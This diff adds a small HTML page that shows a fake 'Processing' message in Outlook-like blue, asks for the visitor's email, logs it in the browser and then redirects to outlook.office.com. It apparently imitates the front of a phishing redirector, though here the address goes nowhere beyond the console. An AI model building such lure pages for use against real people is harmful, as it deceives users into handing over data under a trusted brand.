@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirect with Email</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 10%;
+            background-color: #e6f0ff;
+        }
+
+        h2 {
+            font-size: 48px;
+            margin-bottom: 20px;
+            color: #0072c6;
+        }
+
+        /* Button Style */
+        .button {
+            padding: 20px 40px;
+            font-size: 20px;
+            background-color: #0072c6;
+            color: white;
+            border: none;
+            cursor: pointer;
+            border-radius: 5px;
+            display: inline-block;
+        }
+
+        .button:hover {
+            background-color: #005fa3;
+        }
+
+        input[type="email"] {
+            padding: 10px;
+            font-size: 16px;
+            border: 2px solid #0072c6;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            display: block;
+            width: 50%;
+            margin: 20px auto;
+        }
+    </style>
+</head>
+<body>
+    <h2>Processing.......</h2>
+
+    <!-- Email Input Form -->
+    <form id="emailForm">
+        <input type="email" id="userEmail" name="email" placeholder="Enter your email" required>
+        <button type="submit" class="button">Click Here To Continue</button>
+    </form>
+
+    <script>
+        document.getElementById('emailForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent the form from submitting traditionally
+
+            // Get the email entered by the user
+            const email = document.getElementById('userEmail').value;
+
+            // Process the email as needed, or store it
+            console.log("User's Email:", email);
+
+            // Redirect to the destination after grabbing the email
+            const destination = 'https://outlook.office.com';
+            window.location.href = destination;
+        });
+    </script>
+</body>
+</html>
